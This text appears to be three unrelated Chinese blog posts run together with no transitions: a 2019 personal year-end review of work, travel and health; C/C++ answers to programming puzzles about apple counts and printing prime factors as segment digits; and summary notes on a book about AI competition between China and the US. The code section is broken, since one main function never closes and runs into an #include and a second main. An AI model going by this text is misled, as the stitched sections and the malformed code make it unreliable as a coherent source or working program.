2019年是学习节奏缓慢的一年，生活工作中会遇到很过破事，处理不好就会让人放慢节奏，想要的太多，诱惑也太多，难免堕落。蒋方舟说，人一旦堕落哪怕是短暂的几年，上帝就会以更快的速度收走你的天赋与力量。人常说30而立，立不住，那就保持简单，保持移动。人常说不能老呆在舒适区，那是因为，你怎么知道没有一个更舒适的地方在等你呢？
这篇文章大部分都是图，大家做好心理准备。
新年伊始祖国大好河山，我喜欢登山，因为山高人为峰，让人很有成就感。

回母校，清华桥上我想起了曾经吃饭大学的食堂。

动态血糖仪测试，亲身试验，陕西人吃面不能太多，吃完再喝一碗面汤，那血糖飙升到12 -345 ，简直不能太危险。遂自学加百度，写下了这篇博文：
连续血糖监测(CGM) 初探

陕西人的最爱，扯面，108合一

见识我爷的勋章，共和国大庆，老爷子全国劳模，也是深藏功与名，那个年代的人，需求简单，不求闻达于诸侯，国家人民需要的，就是我需要的。
这个年代的我想法太多，行动太少。。。。

见识了国家健康医疗大数据中心，惠民惠企惠政惠医，这十几个大屏展示效果真是刚刚的。


西安公司
公司在21楼，楼上的风景很好，边上还有公园，吃完饭没事的时候可以去遛弯。
在公司从早到晚，我在这里的时光多于陪我媳妇。


西安近些年来，污染严重，不知为何一直不能解决。每每冬天雾霾，我总想起火星救援里面的台词：I’m the first person to be alone on an entire planet.



公司边上的云水公园，除了冬天，其他时候景色宜人，中饭后，常来遛弯消食，路上针砭时弊，留下很多美好的记忆。





杭州总部
杭州总部在钱塘江边，风景也很好，加班完，晚上还可以去钱塘江边跑步，不过杭州总下雨。如果加班太晚，晚上也没有力气。
公司总部挂了很多许老师的"世界名画" 这张简直精髓，我忍不住cosplay 一下。

杭州卫生 信息中心学习

公司的，早上，傍晚和午夜。



钱塘江边小跑一次，发现似乎宝刀未老，锻炼是重在坚持。
每天锻炼30分，
健康工作100年，
向天再借500年，
还完房贷，
幸福生活一辈子。


开完年会，我们去钱塘江边喝酒。

杭州市政府吃了个爆甜的句子----爆橘


上海BMS 学习
为啥单独把这个列出来，因为这个公司高端到，两个中国人面对面开会，都不想说中文，因为还有全球的研发中心在听。


出差路上

2019年飞了18次，每一次出差都是对心灵的考验。还好目前都是短差。我还挺喜欢这种新鲜的感觉。
偶尔换换地方生活也不错。





阶段性成绩
生命即将迈入奔四，尤其35岁，是技术人的分水岭。
35岁，对于很多工程师而言是个坎，很多工程师懒得搞技术了，就另谋生路去做产品、售前和项目管理，现在只有云计算售前有行业红利，收入暂时高的惊人；而产品经理是在职场冒险，项目管理一直是苦力活。这些另谋生路的朋友，长期看还不如固守IT技能的基本盘。
35岁的裁员潮，其实被淘汰最多的不是干活的工程师，而是基层管理岗位。如果是带头干活的组长经理，就算被裁了还能找到工作；老工程师不能和应届生拼手速拼加班强度。
计算机有很深的理论体系，这是我们这些老工程师构筑经验壁垒的好机会，这套润物无声的理论体系，怎么沉浸下来进入自己的体系呢，写写博客，写写代码，多积累，唯手熟尔。
技术积累
开博10年，总体还算是说的过去，期待能有厚积薄发的那一天。希望 我的2020年能够完成《自然语言实战入门》这个课程的总体ppt 以及视频、博客。
付费专栏：自然语言处理实战入门
付费单篇系列：自然语言处理实战
视频课程：自然语言处理实战入门
免费专栏：简单NLP分析套路
目前，主要是在csdn 上面发发，今年尝试将一些干货写成付费的，发现还是看的人少，可能水平有限吧，后面我还是得坚持下去。很多平台都设置了可以同步，这个功能很好，懒得复制粘贴了。



身体健康
尝试了一下 健身房的健康指数测量器，还有美年大健康的体检。主要就是几个原则：
少熬夜，多运动，戒烟限酒，保持积极的心态，说着容易，做到那那么容易

消费支出
看来主要支出都是倒腾还房贷了。支付宝绑了，信用卡，这俩消费有重叠



最后放一张杭州的广告牌，共勉




那些年我写过的总结
10年IT路，我从大约10年左右开始写年终总结，那时候的文章太矫情，而且透露出与年龄不相符的沉闷，一路走来，我改变了很多，但有一点没有改变，那就是前进的动力。
2013年年中的关键词：生活

我所理解的生活

2013年年底的关键词：温和的坚持，并且傻笑

草稿2013
As time goes by

2014年年中的关键词：世间的事大抵如此

吴家坟女子专修学院郭杜校区计算机分院的学年总结

2015年年中的关键词：earning my living，burning my soul

年少成名的我并没有放弃自己，谁敢说她\他文章比我写的好？！，不服来战！

2015年的关键词：少说多做

2016依然会给我惊喜，谢谢

2016年中的关键词：毕业

从前有一个程序员，成天写代码，后来，他屎了。。。

2016年的关键词：努力，奋斗

2016年简直一晃而过

2017年中的关键词：让我们一起为梦想窒息！

我要用生锈的机关枪击穿现在

同期工作一年后对考研的回顾：

考试，一种严格的水平鉴定方法。

2017年底的关键词：不断前进，永不回头

2017,业界最佳实践

2018年农历新年：只要思想不滑坡，办法总比困难多！

因为我梦见了热情的梦

2018年 研究所离职：费解

IT从业者国企生存指南

2018年 年中：人生大事

结婚是一件人生大事

2018年底：成为一名优秀的程序员

2018 初入IT十年（上）----成为一名优秀的程序员

2019年：视线所及只剩生活

2019 初入IT十年（下）---- 视线所及只剩生活











题目：
讨论帖：
点击打开链接


int main()
{
switch (getchar() - '0')
{
case 2: puts("3"); break;
case 3: puts("25"); break;
case 4: puts("253"); break;
case 5: puts("3121"); break;
case 6: puts("46651"); break;
case 7: puts("823537"); break;
case 8: puts("16777209"); break;
}
#include <stdio.h>
#include <math.h>
size_t apple(size_t b)
{
    return b>0?pow(b,b)-(b-1):0;
}
int main()
{
    printf("%d\n",apple(8));
    return 0;
}



void apple(short bear, short apple_sum, short count){
	if(count == bear){
		return;
	}
	apple_sum += pow(count,count) - count + 1;
	count++;
	apple(bear, apple_sum, count);
}
2.
讨论帖子：
http://bbs.csdn.net/topics/391830032


void print(vector<char>& vData)
{
vector<char>::iterator it = vData.begin();
for(; it != vData.end(); it++)
{
if(*it == '0' || *it == '2' || *it == '3' || *it == '5' || *it == '6' 
|| *it == '7' || *it == '8' || *it == '9')
{
cout<<" - ";
}
else if(*it == '*')
{
cout<<" ";
}
else
{
cout<<"   ";
}
}
cout<<endl;
for(it = vData.begin(); it != vData.end(); it++)
{
if(*it == '0' || *it == '4' || *it == '8' || *it == '9')
{
cout<<"| |";
}
else if(*it == '5' || *it == '6')
{
cout<<"|  ";
}
else if(*it == '*')
{
cout<<" ";
}
else
{
cout<<"  |";
}
}
cout<<endl;
for(it = vData.begin(); it != vData.end(); it++)
{
if(*it == '0' || *it == '1' || *it == '7')
{
cout<<"   ";
}
else if(*it == '*')
{
cout<<"*";
}
else
{
cout<<" - ";
}
}
cout<<endl;
for(it = vData.begin(); it != vData.end(); it++)
{
if(*it == '0' || *it == '6' || *it == '8')
{
cout<<"| |";
}
else if(*it == '2')
{
cout<<"|  ";
}
else if(*it == '*')
{
cout<<" ";
}
else
{
cout<<"  |";
}
}
cout<<endl;
for(it = vData.begin(); it != vData.end(); it++)
{
if(*it == '0' || *it == '2' || *it == '3' || *it == '5' || *it == '6' 
|| *it == '8' || *it == '9')
{
cout<<" _ ";
}
else if(*it == '*')
{
cout<<" ";
}
else
{
cout<<"   ";
}
}
cout<<endl;
}

int main()
{
int n, i, k;
while(cin>>n)
{
i = 2;
if(n < 2)
continue;
vector<int> vData;
while(n >= i)
{
if(n % i == 0)
{
n = n / i;
vData.push_back(i);
}
else
{
i++;
}
}

vector<char> vRes;
int vDataSize = vData.size();
for(k = 0; k < vDataSize; k++)
{
stack<int> temp;
while(vData[k] > 0)
{
int value = vData[k] % 10;
temp.push(value);
vData[k] /= 10;
}
while(!temp.empty())
{
vRes.push_back(temp.top() + 48);
temp.pop();
}
vRes.push_back('*');
}
if(!vRes.empty())
{
vRes.pop_back();
}

print(vRes);
}
return 0;
}

﻿﻿
﻿﻿









文章大纲前言揭开深度学习的面纱从竞技场杀出的世界级创业者两国演义和七巨头人工智能发展的四波浪潮乌托邦、反乌托邦和真正的人工智能危机一个癌症患者的思考简评

前言
随之而来，拥有世界最庞大手机用户群的中国得以最快地积累移动应用数据。移动用户基数使得中国的数据优势是美国的3倍，移动食品配送是美国的10倍，移动支付是美国的50倍，共享单车设施是美国的300倍。而利用这些丰富的数据资源，中国的计算机视觉、无人机、语音识别、语音合成和机器翻译公司，成为全球价值最高的创业企业。
相比人工智能，人类的优势在于创造力和同情心。让人工智能做它擅长的，我们可以创造更多有人情味的职业和岗位，可以有更多富有同情心的医护人员利用人工智能进行医疗诊治、护理，可以有超过现在10倍的老师来帮助孩子在这个新世界获得生存能力并勇敢地茁壮成长。

揭开深度学习的面纱
深度学习是所谓的“狭义人工智能”（narrow AI，或译作“弱人工智能”）——仅用于在特定领域能做出决策、预测和分类的人工智能应用。这已经能产生巨大价值，但仍远远未成为科幻片里的“通用人工智能”（general AI，或译作“强人工智能”）——人类能做的，人工智能都可以做。
深度学习最自然的应用领域是保险、贷款之类的金融业务，因为借款人的相关数据非常多（信用评分、收入、信用卡近期使用情况等），而最优的目标（降低还款违约率）很明确。更进一步的话，深度学习还可以进行自动驾驶，帮助车辆“看”到行驶的路况，如识别像素组成的形状（比如红色圆形），判断它和什么有关（比如红灯“禁行”），以此信息来做出决策（刹车并停车），以达到期望的结果（用最少的时间把我安全送到家）。
人们听到深度学习就兴奋，是因为它的核心能力——识别规律、得出最优解、做出决策可应用在很多日常问题上。
人工智能新时代，谁能保持领先
西方国家点燃了深度学习的火炬，但最大的受益者将会是中国，这种全球性的变化是由两方面转变引起的：从发明的年代转变为实干的年代；从专家的年代转变为数据的年代。
实干的年代
深度学习的先驱吴恩达认为，人工智能类似于第二次工业革命中电力的发明[插图]，本身是一项突破性的技术，一旦被大幅采用，就能革新许多不同的产业。就像19世纪的创业者很快学会运用电力烹饪食物、照亮房间、启动工业设备，今天的人工智能创业者也运用深度学习来落实各种创新应用。人工智能许多抽象的研究工作大都已经完成，研究中遇到的困难大都也已解决，现在是创业者“撸起袖子加油干”，把深度学习算法转换为持续经营的事业的时候了。
数据的年代
现今，成功的人工智能算法需要三样东西：大数据、强大的电脑运算能力，以及优秀（但未必顶尖）的人工智能算法工程师。想在新领域善用深度学习的能力，这三者都是必要的。但在实干的年代，这三者当中最重要的还是数据，因为当电脑的运算能力和工程师的能力达到一定门槛水准之后，数据量的多寡就成为决定算法整体效能与精准度的关键所在。
中国的优势
今天，若想妥善利用人工智能的能力（即21世纪的电力），也需要四项要素：大量的数据、热切的创业者、人工智能科学家，以及对人工智能友善的政策环境。比较各国在这四项要素上的优劣，可以预测未来人工智能新世界的发展情况以及权力天平向哪边倾斜。
人工智能时代真正的危机
人工智能产业倾向于“赢家通吃”，这种倾向将会加剧获利与财富集中的问题。
人工智能时代的新世界秩序
人工智能时代的世界秩序，将会结合下列因素进一步发展：“赢家通吃”的经济，财富空前集中在中、美少数几家公司。我认为，这才是人工智能造成的最大的潜在威胁，因为严重的失业和财富分配不均问题将会造成社会不稳定

从竞技场杀出的世界级创业者
美国企业界对中国创业者掀起的全球浪潮尚未做好准备，因为他们从根本上误解了“克隆家”的成功秘诀——王兴的成功并不是因为他只会借鉴，而是因为他是从血与火的竞争中熬炼出来的冠军角斗士。
“成二代”和“穷二代”
中国经济的飞速崛起没能明显减轻这种匮乏心态，反而在某种程度上加强了大众对新创富机会的极端渴望。很多中国人都曾目睹在政策和法规与市场竞争的状态不充分匹配时，产业、城市与个人是如何在崛起和倾覆间徘徊的。改革开放的总设计师说“先让一部分人富起来”[插图]，才能进一步发展。闪电般的发展速度在某种程度上加重了部分人的焦虑感：如果不抓住新的机会，进入新的市场，就只能眼睁睁地看着身边的人变富。以上三个要素：接受借鉴的文化环境、匮乏心态，以及为抓住创富机会而愿意投入有前景的新产业的迫切，构成了中国互联网生态系统的心理基础。
什么都可以模仿
中国的第一个搜索引擎是麻省理工学院物理学博士张朝阳建立的。他在美国目睹了互联网的早期腾飞，想在祖国带动类似的发展。于是他带着麻省理工教授提供的资金返回中国，试图建造中国互联网的核心基础设施。但是，在和雅虎（Yahoo!）的创办人杨致远面谈之后，张朝阳转换了焦点，打算做一个简体中文的搜索引擎和入口网站。他把这家创新公司命名为“Sohoo”（搜乎），直白地结合了中文“搜索”里的“搜”字，代表这家公司的主要功能，并且仿效了美国公司“Yahoo”的尾音。
模仿到底是一种阻力，还是助力？
硅谷投资人深信，纯正的创新心态是打造谷歌、Facebook、亚马逊、苹果等一流公司的基石。“不同凡想”（think different）的能力，驱动乔布斯、扎克伯格、杰夫·贝佐斯等人打造出了改变整个世界的公司。
谷歌与百度：黄页与购物商场
我在谷歌的4年期间，这样的奋战层出不穷。平心而论，谷歌总部给予我们的自由度，已经远大于大多数硅谷企业给其中国分公司的自由度，我们也利用这一点，发展出许多针对中国需求而优化的产品特点，赢回不少谷歌中国前几年流失的用户。但是总部一直拒绝过多代码“分支”，我们发展每一项新功能，都要与总部打一场硬仗，这让我们动作迟缓，也让我们精疲力竭。许多谷歌中国的员工厌倦了和总公司的斗争，沮丧地离开了。
硅谷大腕为何在中国变成“纸老虎”
我在美国公司工作多年，又花了许多年给它们在中国的竞争对手做投资，我发现硅谷进军中国的方式才是它们在中国市场上失败的重要原因，它们输在了自身的策略与管理上，与中国政府的管理并无关系。美国公司把中国市场和其他市场一视同仁，把中国企业当作一排排等待它们征服的对手，等待着把这些企业从市场的“生死簿”中一个个勾选掉。他们不投入资源，没有耐性，也不给中国团队自由，让团队没办法和中国顶尖的创业者（也是全球顶尖的创业者）竞争。他们认为，在中国市场的主要工作就是向中国用户销售目前已有的产品。而实际上，他们应该根据中国用户的特性与需求，针对性地调整已有产品，或是从头打造更适合中国市场的新产品。他们对产品本地化的抗拒降低了产品迭代的速度，使得本地团队举步维艰。
天生“精益”的创业斗士
“精益创业”方法最早出现于硅谷，《精益创业》（The Lean Startup）[插图]一书的出版让这个方法流行起来。“精益创业”的核心理念是：创始人不知道市场需要怎样的产品，只有市场才知道。因此，创业公司不应该花大量时间，投入大笔金钱，默默地开发自己眼中完美的产品，而是应该快速推出“最小可行产品”（minimum viable product），以此测试市场对该产品不同功能的需求。互联网创业公司能根据用户反馈获得实时数据，立刻开始迭代产品：丢弃用户不用的功能，加上需要的新功能，继续在市场中试水。
王兴的蜕变
在“千团大战”中，王兴用上了他所有的技巧。他在2010年年初创立美团，招募了他先前创立校内网和饭否网时身经百战的老员工来领导公司。他不再采用过去原样借鉴Facebook和Twitter的手法，而是打造了更加迎合中国用户偏好的用户界面——把信息填满了用户界面。
美团建立时团购大战刚开始升温，竞争者在一年时间内为线下广告砸的钱超过了10亿元人民币。当时的主流思想是要想在众多竞争者中脱颖而出，公司必须通过融资获得一大笔钱，并把这笔钱花在广告和补贴上以赢得用户。更高的市场占有率可以融更多的钱，进而重复这个循环。热情的投资人在数千家几乎完全相同的公司上投入了大笔资本，中国的城市居民用低到不可思议的优惠价格，成群结队地在餐馆内用餐。这几乎是中国的创投界在招待全中国人吃晚餐。
创业者、电力与燃料
王兴的故事并非只是“借鉴致富”，他的创业故事背后是中国互联网科技生态系统的进化史，这个生态系统最大的资产就是一批坚毅勇敢、百折不挠的创业者。他们先是在本土节节击退硅谷巨头，学会了如何在全球最残酷的创业环境中生存下来，然后利用中国互联网革命和移动互联网的爆炸式发展，为现在由消费带动的中国新经济注入了活力。这些成就固然了不起，但与这些创业者即将用人工智能带来的改变相比，则是小巫见大巫。互联网在中国的萌发，就像电报的发明，缩短了人与人之间的距离、加速了信息流通、促进了商务拓展。而人工智能在中国的萌发，则会像电力的应用那样，为各行各业赋能，改变市场格局。在竞技场上磨炼过的中国创业者现在看到了这项新技术的潜力，已经在寻找能借此获利的产业与应用。
互联网的未知海域
中国的科技创业公司没有这么好的条件，它们身边满是凶猛的竞争者，虎视眈眈地准备对它们现有的产品逆向分析。它们必须用规模、资金以及劳动力的效率来跟竞争者拉开差距——疯狂烧钱，依靠大量廉价劳动力来运作它们的产品，使它们的商业模式难以复制。这是中国互联网世界的重要特质，是脑袋里根植着硅谷正统观念的美国分析师们无论如何也无法理解的特质。
人工智能时代的数据王国
送外卖、汽车维修、共享单车、街头便利店等行业的互联网化，使中国拥有了人工智能时代的大量关键资源——数据。靠着实地苦干，中国在这方面远远超越了美国，成为全球最大的数据生产国（并且差距还在日益扩大），为中国在人工智能实干年代的领导地位奠定了基础。
轻量与重磅
O2O展示了硅谷与中国之间更深层的区别，我称为“轻量”（going light）和“重磅”（going heavy）。这两个词指的是互联网公司在一项产品或服务方面的涉入有多深，还代表着公司连接线上与线下世界时的垂直整合程度。这一模式的选择在人工智能的实干时代影响会更大。打算颠覆新产业时，美国的互联网公司往往采取“轻量”模式。它们普遍认为，互联网的根本力量在于分享信息，消除知识鸿沟，用数字的方式连接大众。它们身为互联网公司，坚守着这股力量。硅谷创业公司会自己建立平台，但会选择让实体企业处理现实世界里的工作。它们希望通过智取战胜竞争对手，用优雅的代码解决信息问题。
愿意重磅——花钱、管理劳动力、提供跑腿、建立规模经济——改变数字经济的同时也改变了实体经济。中国的互联网更深入地渗透了大众的经济生活，并且影响着消费趋势及就业市场。在麦肯锡公司（McKinsey &Company）2016年做的一项调查中，65%的中国O2O用户说移动应用让他们在吃饭上花了更多的钱。另外，分别有72%和42%的用户说移动应用增加了他们在旅行和交通上的消费。
模糊的界限与美丽新世界
世界排行前五大的新创公司，包括蚂蚁金服、小米、滴滴出行、Uber和美团网，中国已经占有四席，这五家公司都是数据驱动+AI
但是中国还有未被发掘的更大宝藏。如同长期埋藏在地下的有机物质最终变成推动工业革命的化石燃料一般，中国互联网公司利用现实世界中丰富的互动获得了推动其人工智能革命的庞大数据。这个多维世界的每一个维度都为数据的增加提供了新的增长点，这些规模空前的数据能够细致描绘现实世界用户的消费及出行习惯。O2O业务的爆炸式增长提供了海量的用户线下生活数据：每天的餐饮、按摩、美容美发及其他日常活动的时间、地点和内容。移动支付打开了实体世界消费的黑匣子，给这些公司提供了消费者行为精确、实时的数据图。共享单车在各个城市投放的物联网交通器材，追踪记录了数千万前往公司、商店、住所及初次约会地点的行程。这些数据在量与质方面都远远胜过了Uber及来福车（Lyft）之类公司手中的数据。

两国演义和七巨头
毫不夸张地说，1999年以前，中国科技人员对人工智能几乎一无所知。那一年，我到中国科学技术大学做讲座，给同学们介绍刚成立一年的微软中国研究院在图像识别研究上的进展。这所大学的工程学院在全国名列前茅，但它不在北京，坐落于相对偏远的安徽省合肥市。
这些学生手里拿的课本是当时中国最好的教材，虽然大多数版本老旧、翻译不佳。在当时，优秀学生很难出国读书，除非有全额奖学金，在互联网没有普及的校园里，泛黄的教科书和偶尔来访的学者的讲座，是他们接触全球人工智能研究的唯二途径。20年过去，现在一切都不一样了。
人工智能超级大国的那些事
在21世纪要建设人工智能超级大国，需要具备四个条件：大量的数据、执着的企业家、优秀的人工智能科学家和有利的政策环境。中国创业公司的竞技场选拔出了世界上最精明强悍的企业家，中国的另类互联网世界创造了世界上最丰富的数据生态环境，再加上另外两项助力——人工智能专家的涌现和中国政府的政策支持，在这个人工智能实干的年代，硅谷的优势将不复存在。
诺奖得主与无名工匠
费米和曼哈顿计划代表了在专业知识领域，质量高于数量的时代。20世纪三四十年代是核物理学基础学科取得突破的时代。为了实现这些突破，一个恩里科·费米比一千个普通的物理学家都重要。这个时代的美国确立在世界上的主导地位，很大程度是由于吸引了像费米一样的天才。但并非每次科技革命都是这种模式。通常，基础领域的突破出现后，发展的重心会很快从顶尖科学家转移到无名工匠，即有足够专业能力将这种新技术应用于解决不同问题的工程师，尤其是当技术突破性成果的应用范围遍布整个社会经济体系，而非集中于某几个实验室或者武器系统的应用时。
人工智能的电网、电池之战
“电网”式的目标就是将机器学习的力量转化成标准化服务，可以由任何公司购买，无论是达成学术目的还是个人使用都可以通过云计算平台实现共享，甚至可以免费使用。这个模式中，云计算机平台就是电网，作用是根据用户提供的不同数据，实现复杂机器学习最佳化。“电网”式可以降低专业门槛，提升云人工智能平台的功能。连入“电网”就能让有大数据的传统公司轻易使用到最棒的人工智能，而不用将优化人工智能作为核心工作。
相对较小的人工智能创业公司则选择了另一条路：为各行各业打造具有高度针对性的人工智能“电池”，这时“电网”还没有成形。这些创业公司靠的是深度而非广度。它们不打算提供通用型的机器学习能力，而是为特定目的打造产品、打磨算法，如医疗诊断、抵押贷款和自动无人机等。它们把宝押在了传统商业日常运营中，众多琐碎细节无法很好地跟通用网络契合在一点上。准确地说，这些创业公司不是要让传统公司“用标准的”人工智能，而是为传统公司量身打造能即刻融入公司正常流程的人工智能。
中国芯片的机会与挑战
现在，随着传统计算机程序逐渐被人工智能算法替代，需求再次发生了变化。机器学习需要快速运行复杂的数学计算，这一点是英特尔或者高通公司的芯片都不曾注重的。于是，以设计电子游戏所需的高性能图像处理芯片闻名的英伟达（Nvidia）乘虚而入，图像处理背后的数学原理与人工智能算法的需求十分匹配，英伟达也因此成了芯片市场的新星。当英特尔犹豫不定时，仅百度一家公司从英伟达购进的深度学习芯片的数量就达到向英特尔采购数量的4倍。2016年到2018年年初，英伟达的股价翻了10倍。
人工智能发展的四波浪潮

目前，人工智能革命分为四波浪潮：互联网智能化（Internet AI）、商业智能化（business AI）、实体世界智能化（perception AI）、自主智能化（autonomous AI）。每一波浪潮都将以不同方式利用人工智能的力量，颠覆不同产业，让人工智能更深层次地融入我们的生活。
第二波浪潮：商业智能化
第一波人工智能浪潮的基础是给互联网用户的浏览数据贴标签，而商用人工智能则是给传统公司数十年来积累的大量专业数据贴标签，如保险公司理赔事故中鉴别保险欺诈，银行核发贷款时记录还款率，医院保存医疗诊断记录及患者存活率等。
这些细微的关联性往往没人能解释清因果，例如为何在星期三取得贷款的借款人往往能较快地偿还贷款。
请到算法诊所就诊
商用人工智能并非只能用在跟钱有关的领域，它同样可以用在数据驱动的公共服务上，让许多之前负担不起这些服务的人享受科技带来的红利，促成高质量服务大规模推广。这方面，最具前景的领域之一是医疗诊断。
曾经在硅谷及百度从事深度学习工作的中国人工智能研究人员邓侃，创立了大数医达科技公司，该公司研发了专门训练医疗领域的人工智能算法，使它们成为能够部署在全国各地的超级诊断师。它们并不想用算法取代医生，而是要辅助医生诊断。算法在诊断流程中扮演“导航”的角色，用大数据规划最佳路径，但人类医生会主导最终的判断。诊断的范围随着算法得到的信息增加而缩小，这时更详细、高度确定的数据可以帮助判断症状的起因，以及其他诊断结果的正确性及患病概率。这款应用给医生的建议，是依靠其超过4亿条医疗记录（并且还在持续扫描最新医学文献）的数据，把全球顶尖医学知识平均分配在医疗资源不均衡的社会中，让所有医生和护士都能聚焦在机器做不到的人类工作上，如使病患感受到关怀，更人性化地和病患分享诊断结果。
看不见的法庭助手
科大讯飞率先把人工智能应用在另一个资源和能力分布高度不均的领域——司法界。在上海进行的试点中，科大讯飞使用以往案例数据，向法官提出有关证据及判决的建议。该公司开发的证据交互参照系统，使用语音识别与自然语言处理技术来比较所有证据，如证词、文件及背景资料等，并找出其中的矛盾点，同时提醒法官注意这些有争议的地方，让法院审理人员可以进一步核实。量刑时，法官可以把被告的犯罪记录、年龄、造成的伤害等相关信息输入判决辅助人工智能系统。该系统存储了大量的判决记录，可以从类似案例中做出有关量刑或罚款的建议。
OMO驱动的教育
现行的教育体系大致上仍然是19世纪的“工厂模式”：所有学生在同一地点、同一时间，以相同速度及相同方式学习。学校采用“流水线”模式，让孩子一年升一级。在老师投入教学、辅导与评估学生的时间与精力非常有限的情况下，这种模式是有道理的。但现在人工智能可以消除这些限制，人工智能的感知、识别与建议能力，能够针对每个学生打造不同的学习流程，也可以让老师腾出更多时间，对学生提供一对一辅导。人工智能驱动的教育有四种应用场景：课堂教学、家庭作业与练习、考试与评分、量身打造的家教辅导。
公共数据与个人隐私
这样收集数据可能会令许多美国人感到不安，他们不想暴露太多的个人隐私。但中国人更容易接受自己的面孔、声音及购物选择被记录与数字化，更愿意用个人的信息来换取便利。中国的各大城市已在使用大量的摄影机与传感器网络。这个监控网络把视频数据直接导入负责管理交通、公安以及紧急服务的优化算法中。
深圳制造
现在，中国制造业的最大优势不是廉价劳力，印度尼西亚及越南之类的国家的工资更低。中国制造业现在的最大优势是无可匹敌的供应链灵活性，以及能够研发出新器材的原型并且量产优秀的工程师。
谷歌模式与特斯拉模式
谷歌在收集这部分资料的过程中，采取缓慢稳定的步速，他们用小规模车队装备高级传感设备，上路测试、收集数据。特斯拉则在其商业车款上安装较便宜的设备，让车主在使用特定自动驾驶的同时，也为特斯拉收集了数据。这两种不同的模式导致谷歌与特斯拉的数据收集量产生了巨大差距。截至2018年6月，谷歌花了8年收集到800万英里的现实世界驾驶数据，而特斯拉仅用了2年就收集到12亿英里的现实世界驾驶数据。
中国的特斯拉模式
雄安新区将成为全球第一个从开始就容纳自动驾驶汽车的城市，百度已经和当地政府签约，打造“人工智能城”，聚焦于交通管理、自动驾驶汽车及环境保护。混凝土中需要加入传感器，交通信号灯装备计算机视觉硬件，十字路口可以知道每一位行人的年龄，泊车所需的空间明显减少。当人人都能随时随地召唤自动驾驶的出租车时，甚至可以把停车场改成城市公园。
围绕自主人工智能技术的较量
美国和中国在自动驾驶汽车这个领域胜出的机会是五五开，至于自主无人机之类的硬件密集型应用领域，中国将具备优势
征服当地市场&武装当地公司
中国的公司避开了直接竞争，转而投资硅谷公司试图消灭的当地创业公司。比如在印度及东南亚，阿里巴巴和腾讯投资了当地与亚马逊等巨头竞争的本土创业公司，这是中国智慧的体现。马云等中国的创业家深知，强龙不压地头蛇。因此，在进军国外市场时，中国的公司不会试图消灭当地的创业公司，而是与之组成联盟。
从中国市场打到国际市场的共享出行
中国公司的全球化策略在共享出行市场已经启动。这可以总结为人工智能全球化的另一种模式：结合人工智能技术与当地的数据，对当地创业公司赋能。这种以合作为基础，而非征服的模式，或许更适合把人工智能这类需要顶尖工程师、由下而上收集数据的技术推广至全球。
人工智能力量进入我们的世界后，真正的分歧不在国家之间，而在每个国家内部。

乌托邦、反乌托邦和真正的人工智能危机
谷歌首席未来学家雷·库兹韦尔（Ray Kurzweil）设想了一个极端的未来，他认为人类和机器将完全融合。他预言，我们会将自己的思维上传到云，通过放入我们血流中的智能纳米机器人不断更新我们的身体。而现在距离实现强人工智能只差10年，2045年，我们将会迎来奇点时刻。
DeepMind创始人哈萨比斯则预言，创造超级智能可以让人类文明解决目前无解的难题，如为全球变暖和不治之症带来绝妙的解决方案。
反乌托邦阵营中的大部分人其实并不担心人工智能会像《终结者》（The Terminator）等科幻电影中想象的那样接管世界，他们真正恐惧的是如果人类本身成为超级智能实现某一目标的障碍，例如改变全球变暖，它们可以轻易甚至是无意中将人类从地球上抹去。对于想象力远超人类的计算机程序而言，抹杀人类根本不需要像电影中持枪机器人一样粗鲁。对于化学、物理和纳米技术的深刻理解，让它们可以用巧妙得多的方式立即完成任务。
盲目乐观的终结
1980年到2016年，随着ICT的收益越来越多地集中到前1%的人手中，美国的精英群体在国民经济中的份额近乎翻倍[插图]。到2017年，站在美国金字塔尖1%的人拥有的财富几乎是下层90%的人拥有的总财富的两倍[插图]。而普通美国人的实际工资在30年中保持不变，最贫穷的美国人的工资还降低了[插图]。美国的工作岗位和工资水平停滞不前，ICT在其中发挥了多大作用？全球化、工会衰落和外包都是相关因素，但有一个特点很明显：ICT不同于蒸汽机和电气化，它“偏重技能”（skill-bias），通过打破信息传播障碍，增强了世界顶尖知识工作者的力量，而将中间许多人的经济作用缩减了一半。所以，有一件事越来越明确：没人能保证提高了生产力的GPTs还能为工人带来更多的工作岗位或更高的工资。
硬件：更好，更快，更强
人工智能会在三个催化剂的作用下加速自身的应用与扩散进程，这些催化剂在蒸汽动力和电力投入广泛应用时是不存在的。
第一个催化剂是人工智能算法的易复制性。
第二个催化剂是风险投资业（VC）的诞生。
如今，VC已是新技术商业化的一种常见投资方式。2017年，全球风险投资创造了1480亿美元的新纪录。
第三个催化剂是中国的影响力。
综上所述，我相信我们可以确定以下几件事：第一，在工业时代，新技术带来了长期就业机会增长和工资水平的增长；第二，新的GPTs依然很罕见且重要，应单独评估各个GPT对于就业的影响；第三，在被广泛认可的三个GPTs中，蒸汽动力和电气化同时推动了生产力和就业率提高，ICT提高了生产力却不一定增加就业；第四，人工智能也会是一种GPT，它偏重于技能，应用速度快（受到数字传播、风险投资和中国影响力的加持），这两个特性表明人工智能会对就业和收入分配产生不利影响。
人工智能的“可以”与“不可以”

体力劳动

脑力劳动
两类失业：“一对一取代”和“彻底清除”
换句话说，“工作任务分析法”研究的是机器一对一取代人类工人的可能性。而我是一名技术专家和早期风险投资者，我的专业背景教会我尝试以不同的方法解决问题。在职业生涯早期，我致力于将先进的人工智能技术转化为有用的产品。同时，作为风险资本家，我也投资和协助一些新的创业公司。这两份工作让我发现人工智能对工作岗位构成的威胁不只是“一对一取代”，还有“彻底清除”。
中美失业问题对比与莫拉维克悖论
著名科技评论家维韦克·瓦德华（Vivek Wadhwa）预测，智能机器人将削弱中国在劳动力方面的优势，制造业的春天将再次降临在美国，但不会为人类创造工作岗位。瓦德华写道：“美国机器人和中国机器人一样勤奋，而且都不会抱怨，也不会加入工会。”
与一般的观点相反，让人工智能模仿成年人高知识水平或运算能力比较容易，但要让机器人具备婴儿的感知和感官运动能力，则困难得多。本质上，人工智能是“演算的巨人，行动的矮子”。
担心算法还是担心机器人？
人工智能算法对脑力劳动的替代像是导弹空袭，但机器人对体力劳动的打击则接近于地面的堑壕战。长期来看，我认为中国和美国自动化的风险是相似的，但说到对变化的适应，中国的特殊经济结构将会为其争取到一定的时间。
随之而来的个人危机
自工业革命以来的数个世纪里，工作不仅是一种谋生手段，更是一种自我认可以及生活意义的源泉。当我们身处社会之中，需要自我介绍或介绍他人时，首先提到的就是工作。工作让我们过得充实，给人一种规律感，让我们和其他人联结。固定的薪水不仅是一种劳动报酬方式，也代表了个人对于社会的价值，表明每个人都是社会的重要成员。

一个癌症患者的思考
生活就像一套具有明确优化目标的算法：最大化个人影响力的同时就会最小化对该目标无益的任何事情。
你想在墓碑上写什么？
